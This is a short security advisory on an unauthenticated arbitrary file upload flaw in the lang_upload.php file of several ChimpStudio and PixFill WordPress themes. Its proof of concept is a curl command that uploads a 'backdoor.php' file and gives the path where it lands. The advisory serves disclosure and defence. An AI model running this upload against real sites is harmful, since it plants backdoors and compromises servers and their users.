# Multiple themes - Unauthenticated Arbitrary File Upload

### Description

Multiple themes from ChimpStudio and PixFill does not have any authorisation and upload validation in the lang\_upload.php file, allowing any unauthenticated attacker to upload arbitrary files to the web server.

### Proof of Concept

Create a malicious file "backdoor.php", then curl https://website.com/wp-content/themes/westand/include/lang\_upload.php -F "mofile[]=@backdoor.php"
The file will be at https://example.com/wp-content/themes/westand/languages/backdoor.php
